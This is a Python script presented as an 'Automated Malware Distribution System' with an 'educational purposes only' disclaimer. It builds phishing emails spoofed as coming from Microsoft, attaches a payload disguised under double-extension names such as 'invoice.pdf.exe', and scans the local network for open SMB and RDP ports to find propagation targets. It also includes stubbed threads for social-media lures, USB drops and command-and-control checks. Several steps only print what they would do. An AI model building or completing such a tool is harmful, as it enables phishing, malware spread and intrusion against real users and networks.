#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Automated Malware Distribution System
WARNING: This is for educational purposes only!
"""

import os
import time
import random
import smtplib
import requests
import threading
import subprocess
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders

class AutoDistributor:
    def __init__(self):
        self.email_lists = []
        self.social_accounts = []
        self.usb_targets = []
        self.network_targets = []
        self.distribution_active = False
        
    def start_distribution_campaign(self):
        """Start automated distribution campaign"""
        print("Starting automated distribution campaign...")
        self.distribution_active = True
        
        # Start all distribution methods in parallel
        threads = [
            threading.Thread(target=self.email_campaign),
            threading.Thread(target=self.social_media_campaign),
            threading.Thread(target=self.usb_drop_campaign),
            threading.Thread(target=self.network_propagation),
            threading.Thread(target=self.monitor_infections)
        ]
        
        for thread in threads:
            thread.daemon = True
            thread.start()
        
        # Keep running
        try:
            while self.distribution_active:
                time.sleep(60)
                self.print_status()
        except KeyboardInterrupt:
            self.distribution_active = False
            print("Distribution campaign stopped")
    
    def email_campaign(self):
        """Automated email phishing campaign"""
        print("Starting email campaign...")
        
        # Email templates
        templates = [
            {
                "subject": "Urgent: Security Update Required",
                "body": "Your system requires an immediate security update. Please run the attached file.",
                "attachment": "security_update.exe"
            },
            {
                "subject": "Invoice Payment Required",
                "body": "Your account has a pending payment. Please review the attached invoice.",
                "attachment": "invoice.pdf.exe"
            },
            {
                "subject": "Job Application Update",
                "body": "Your job application has been reviewed. Please complete the attached form.",
                "attachment": "application.exe"
            }
        ]
        
        # Target email lists (example)
        target_emails = [
            "user1@company.com",
            "user2@company.com", 
            "user3@company.com"
        ]
        
        while self.distribution_active:
            try:
                for email in target_emails:
                    template = random.choice(templates)
                    self.send_phishing_email(email, template)
                    time.sleep(random.randint(30, 120))  # Random delay
                    
            except Exception as e:
                print(f"Email campaign error: {e}")
                time.sleep(300)  # Wait 5 minutes on error
    
    def send_phishing_email(self, target_email, template):
        """Send phishing email to target"""
        try:
            # Create message
            msg = MIMEMultipart()
            msg['From'] = "noreply@microsoft.com"
            msg['To'] = target_email
            msg['Subject'] = template['subject']
            
            # Add body
            msg.attach(MIMEText(template['body'], 'plain'))
            
            # Add attachment (malware)
            if os.path.exists("app.py"):
                with open("app.py", "rb") as attachment:
                    part = MIMEBase('application', 'octet-stream')
                    part.set_payload(attachment.read())
                    encoders.encode_base64(part)
                    part.add_header(
                        'Content-Disposition',
                        f'attachment; filename= {template["attachment"]}'
                    )
                    msg.attach(part)
            
            # Send email (would need SMTP server configuration)
            print(f"Would send email to: {target_email}")
            
        except Exception as e:
            print(f"Error sending email: {e}")
    
    def social_media_campaign(self):
        """Automated social media distribution"""
        print("Starting social media campaign...")
        
        posts = [
            "Check out this amazing new app! Download link in bio",
            "Free software giveaway - limited time only!",
            "New game everyone is playing - download now!",
            "Professional tools for free - get them while you can!",
            "Crypto trading bot that makes money - download free!"
        ]
        
        while self.distribution_active:
            try:
                post = random.choice(posts)
                print(f"Would post: {post}")
                time.sleep(random.randint(1800, 3600))  # 30-60 minutes
                
            except Exception as e:
                print(f"Social media error: {e}")
                time.sleep(600)
    
    def usb_drop_campaign(self):
        """Automated USB drop campaign"""
        print("Starting USB drop campaign...")
        
        locations = [
            "Company parking lot",
            "University campus",
            "Coffee shop",
            "Airport terminal",
            "Government building"
        ]
        
        while self.distribution_active:
            try:
                location = random.choice(locations)
                print(f"Would drop USB at: {location}")
                time.sleep(random.randint(3600, 7200))  # 1-2 hours
                
            except Exception as e:
                print(f"USB drop error: {e}")
                time.sleep(1800)
    
    def network_propagation(self):
        """Automated network propagation"""
        print("Starting network propagation...")
        
        while self.distribution_active:
            try:
                # Scan for vulnerable machines
                self.scan_network()
                time.sleep(random.randint(300, 900))  # 5-15 minutes
                
            except Exception as e:
                print(f"Network propagation error: {e}")
                time.sleep(600)
    
    def scan_network(self):
        """Scan network for vulnerable targets"""
        try:
            import socket
            
            # Get local network
            hostname = socket.gethostname()
            local_ip = socket.gethostbyname(hostname)
            network = '.'.join(local_ip.split('.')[:-1])
            
            # Scan common ports
            ports = [135, 139, 445, 3389]
            
            for i in range(1, 10):  # Scan first 10 IPs
                target_ip = f"{network}.{i}"
                
                for port in ports:
                    try:
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.settimeout(0.1)
                        result = sock.connect_ex((target_ip, port))
                        
                        if result == 0:
                            print(f"Found target: {target_ip}:{port}")
                            # Would attempt exploitation here
                            
                        sock.close()
                        
                    except Exception:
                        pass
                        
        except Exception as e:
            print(f"Network scan error: {e}")
    
    def monitor_infections(self):
        """Monitor successful infections"""
        print("Starting infection monitoring...")
        
        while self.distribution_active:
            try:
                # Check C2 server for new infections
                self.check_c2_server()
                time.sleep(60)  # Check every minute
                
            except Exception as e:
                print(f"Monitoring error: {e}")
                time.sleep(300)
    
    def check_c2_server(self):
        """Check C2 server for new infections"""
        try:
            # Would connect to C2 server
            print("Checking C2 server for new infections...")
            
        except Exception as e:
            print(f"C2 check error: {e}")
    
    def print_status(self):
        """Print distribution status"""
        print("\n" + "="*50)
        print("DISTRIBUTION CAMPAIGN STATUS")
        print("="*50)
        print(f"Email campaign: Running")
        print(f"Social media: Running")
        print(f"USB drops: Running")
        print(f"Network propagation: Running")
        print(f"Infection monitoring: Running")
        print("="*50)
    
    def stop_campaign(self):
        """Stop distribution campaign"""
        self.distribution_active = False
        print("Distribution campaign stopped")

def main():
    """Main execution function"""
    print("="*60)
    print("AUTOMATED MALWARE DISTRIBUTION SYSTEM")
    print("="*60)
    print("WARNING: This is for educational purposes only!")
    print("="*60)
    
    distributor = AutoDistributor()
    
    try:
        distributor.start_distribution_campaign()
    except KeyboardInterrupt:
        distributor.stop_campaign()
    except Exception as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    main()


